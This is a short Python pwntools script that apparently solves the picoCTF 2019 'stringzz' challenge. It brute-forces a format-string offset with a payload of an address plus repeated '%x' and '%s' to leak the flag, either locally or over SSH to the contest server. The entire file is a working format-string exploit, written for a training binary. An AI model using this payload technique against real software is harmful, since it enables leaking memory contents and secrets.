from pwn import *

if args['REMOTE']:
    s = ssh(host='2019shell1.picoctf.com', user='jib1337', password='notmyrealpasswordlol')
    target = 'picoCTF{'
else:
    target = 'flag{'

elf = context.binary = ELF('vuln')

val = 1
result = ''
while target not in result:
    
    if args['REMOTE']:
        p = s.process('vuln', cwd='/problems/stringzz_6_5f0e31bfd7b9a7c6a32d22b6d57e9010')
    else:
        p = process(elf.path)

    payload = p32(0x576c95b0) + '%x'*val + '%s'

    p.sendlineafter(':\n', payload)
    result = p.recvall(timeout=5).decode('utf-8', 'replace')
    val += 1

print(result)
